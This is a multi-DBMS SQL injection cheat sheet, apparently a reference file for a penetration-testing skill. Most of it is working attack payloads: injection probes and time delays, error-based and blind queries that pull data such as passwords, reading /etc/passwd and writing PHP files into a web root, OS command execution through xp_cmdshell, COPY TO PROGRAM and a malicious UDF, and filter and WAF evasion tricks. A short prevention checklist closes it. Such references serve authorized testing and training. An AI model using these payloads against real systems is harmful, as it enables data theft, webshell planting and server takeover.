# SQL Injection Cheat Sheet — Multi-DBMS Quick Reference

Load this file when you need a ready payload/metadata query and want to avoid trial-and-error across DBMS dialects. Distilled from NeaByteLab/SQL-Injection-Manual (`Guide/22-Cheat-Sheet.md`), PortSwigger SQLi cheat sheet, pentestmonkey, PayloadsAllTheThings.

## Detection Payloads

| Test | Payload | Vulnerable indicator |
|---|---|---|
| Quote | `'` | SQL error / 500 |
| Double quote | `"` | SQL error / 500 |
| Escaped quote | `''` | no error while `'` errored → string context |
| Comment | `--` `#` `/**/` | error disappears when comment closes clause |
| Boolean true | `' AND 1=1--` | normal response |
| Boolean false | `' AND 1=2--` | different/empty response |
| Arithmetic | `2-1` vs `1` | identical page → expression evaluated |

## Time-Based Detection by DBMS

| DBMS | Payload |
|---|---|
| MySQL | `' AND SLEEP(5)--` |
| PostgreSQL | `'; SELECT pg_sleep(5)--` |
| MSSQL | `'; WAITFOR DELAY '0:0:5'--` |
| Oracle | `' AND DBMS_LOCK.SLEEP(5)--` / `DBMS_PIPE.RECEIVE_MESSAGE(CHR(98),5)` |
| SQLite | `' AND randomblob(1000000000)--` |

## Fingerprinting & Metadata

| Purpose | MySQL | MSSQL | PostgreSQL | Oracle | SQLite |
|---|---|---|---|---|---|
| Version | `@@version` | `@@VERSION` | `version()` | `SELECT banner FROM v$version WHERE ROWNUM=1` | `sqlite_version()` |
| Current DB | `database()` | `DB_NAME()` | `current_database()` | `SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL` | N/A (file) |
| Current user | `user()` | `SYSTEM_USER` | `current_user` | `SELECT user FROM DUAL` | N/A |
| Host info | `@@hostname`,`@@datadir` | `@@SERVERNAME` | `inet_server_addr()` | `UTL_INADDR.GET_HOST_ADDRESS` | N/A |
| List DBs | `information_schema.schemata` | `master..sysdatabases` | `pg_database` | `all_tables` owners | N/A |
| List tables | `information_schema.tables WHERE table_schema=database()` | `sys.tables` / `sysobjects WHERE xtype='U'` | `pg_tables WHERE schemaname='public'` | `user_tables` | `sqlite_master WHERE type='table'` |
| List columns | `information_schema.columns WHERE table_name='users'` | `sys.columns WHERE object_id=OBJECT_ID('users')` | `information_schema.columns` | `user_tab_columns WHERE table_name='USERS'` | `PRAGMA table_info(users)` |

## UNION Concatenation Syntax

| DBMS | Combine columns into one field |
|---|---|
| MySQL | `CONCAT(col1,0x3a,col2)` / `CONCAT_WS(':',c1,c2)` / `GROUP_CONCAT(c1 SEPARATOR ',')` |
| MSSQL | `col1+':'+col2` / `CONCAT(c1,':',c2)` / `STRING_AGG` |
| PostgreSQL | `col1||':'||col2` / `string_agg(c1,',' )` |
| Oracle | `col1||':'||col2` / `LISTAGG(c1,',') WITHIN GROUP (ORDER BY c1)` |
| SQLite | `col1||':'||col2` / `group_concat(c1,',')` |

Paging rows without LIMIT: MSSQL `TOP n`, Oracle `WHERE ROWNUM<=n`, PostgreSQL `LIMIT n OFFSET m`.

## Error-Based Extraction

```sql
-- MySQL
' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--
-- MSSQL
' AND 1=CONVERT(int,(SELECT @@version))--
-- PostgreSQL
' AND 1=CAST((SELECT version()) AS int)--
-- Oracle
' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--
' AND 1=(SELECT TO_CHAR(1/0) FROM dual)--   -- plus CASE for blind errors
-- SQLite (via JSON misparse, 3.x+)
' AND 1=CASE WHEN (SUBSTR(sqlite_version(),1,1)='3') THEN JSON_ARRAY(1/0) ELSE NULL END--
```

## Boolean Blind Character Inference

```sql
' AND SUBSTRING((SELECT @@version),1,1)='5'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>80--   -- binary search
' AND (SELECT COUNT(*) FROM users)>0--                                   -- existence checks
-- Oracle: SUBSTR + ROWNUM;  MSSQL: SUBSTRING + TOP 1;  PG: SUBSTRING + LIMIT
```

## Conditional Statements (per DBMS)

```sql
-- MySQL
' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)--
-- SQL Server
'; IF((SELECT COUNT(*) FROM users)>0) WAITFOR DELAY '00:00:05'--
-- PostgreSQL
' AND (SELECT CASE WHEN COUNT(*)>0 THEN pg_sleep(5) ELSE 0 END FROM users)::int IS NOT NULL--
-- Oracle (no IF; use CASE + heavy subselect or DBMS_PIPE)
' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM all_users)>0 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END FROM dual)=0--
```

Extra fingerprint variants: `' AND @@version LIKE '5%'--` (MySQL), `' AND version() LIKE 'PostgreSQL%'--` (PG), `' AND (SELECT banner FROM v$version WHERE rownum=1) LIKE 'Oracle%'--` (Oracle), `' AND 1=dbms_pipe.receive_message('a',3)--`.

## File Operations

| Direction | MySQL | PostgreSQL | MSSQL | Oracle |
|---|---|---|---|---|
| Read | `LOAD_FILE('/etc/passwd')` | `pg_read_file('postgresql.conf',0,1000)` / `lo_import`+`lo_get` | `OPENROWSET(BULK 'C:\f.txt',SINGLE_CLOB)` | `UTL_FILE.FGET_ATTRIBUTES/FOPEN` |
| Write | `INTO OUTFILE '/var/www/s.php'` | `COPY (SELECT ...) TO '/path'` / `lo_export` | `xp_cmdshell` / OLE Automation | `UTL_FILE.PUT_LINE` / external tables |

MySQL pre-check: `@@secure_file_priv` (must be `''` or target dir) and `FILE` privilege.

## OS Command Execution

| DBMS | Method | Example |
|---|---|---|
| MSSQL | xp_cmdshell | `'; EXEC xp_cmdshell('whoami')--` (enable via `sp_configure` if sysadmin) |
| PostgreSQL | COPY PROGRAM | `'; COPY (SELECT '') TO PROGRAM 'id';--` |
| MySQL | UDF | `sys_exec('id')` after loading evil.so |
| Oracle | Java / Scheduler | dbms_java permissions, `DBMS_SCHEDULER` job |
| DB2 (IBM i) | QCMDEXC | `CALL QSYS2.QCMDEXC('cmd')` |

## Filter-Evasion Quick Table

| Blocked | Bypass options |
|---|---|
| Space | `/**/`, `%09 %0a %0b %0c %0d`, `%(name)s` paren tricks, `SELECT(username)FROM(users)` |
| `,` | `JOIN` subquery union, `LIMIT 1 OFFSET 0`, `SUBSTRING(x FROM 1 FOR 1)` |
| `'` | hex `0x61646D696E`, `CHAR()/CHR()`, dollar-quoting (PG), wide-byte GBK |
| `UNION`/`SELECT` | case mix, `UN/**/ION`, `/*!50000UNION*/`, double-write `uunionnion`, PREPARE+hex, HANDLER |
| `OR`/`AND` | `\|\|`, `&&`, `DIV 0`, XOR `^` |
| `=` | `LIKE`, `IN`, `BETWEEN`, `REGEXP`, `<>` negation |
| `information_schema` | `mysql.innodb_table_stats`, `sys.schema_table_statistics`, `pg_tables`, `sysobjects` |
| WAF signature | polyglot `SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/`, HPP, chunked encoding, JSON operators |

## Common Table / Column Names (for guessing when metadata is blocked)

Tables: `users admin administrators user_accounts customers members orders sessions tokens logs config settings credentials credit_cards products`.
Columns: `username user_name login email password pass pwd passwd hash salt token api_key role is_admin id created_at status card_number cvv balance`.

No-metadata extraction (positional): `SELECT `2` FROM (SELECT 1,2 UNION SELECT * FROM users)a LIMIT 1,1`.

## Error Signatures → DBMS

| Error text | Backend |
|---|---|
| `You have an error in your SQL syntax` / `MariaDB` | MySQL/MariaDB |
| `Microsoft SQL Server` / `Unclosed quotation mark` / `OLE DB Provider` | MSSQL |
| `PostgreSQL query failed` / `PG::` / `unterminated quoted string` | PostgreSQL |
| `ORA-0xxxx` | Oracle |
| `SQLite3::query` / `SQLite/JDBCDriver` | SQLite |
| `DB2 SQL error` / `SQLCODE` | DB2 |

## Prevention Checklist (mirror into reports)

- Parameterized queries / prepared statements everywhere; bind values, never concatenate.
- Whitelist-validate identifiers (table/column/order) that can't be bound.
- Least-privilege DB accounts: no FILE, no sysadmin/dba, no `TO PROGRAM`.
- Disable verbose DB errors in production; generic error pages.
- Input validation + output encoding; ORM with safe query builders.
- WAF/IPS as defense-in-depth only — signatures get bypassed (see SKILL.md §8).
- Fix second-order sinks: re-treat stored data as untrusted on every read path.
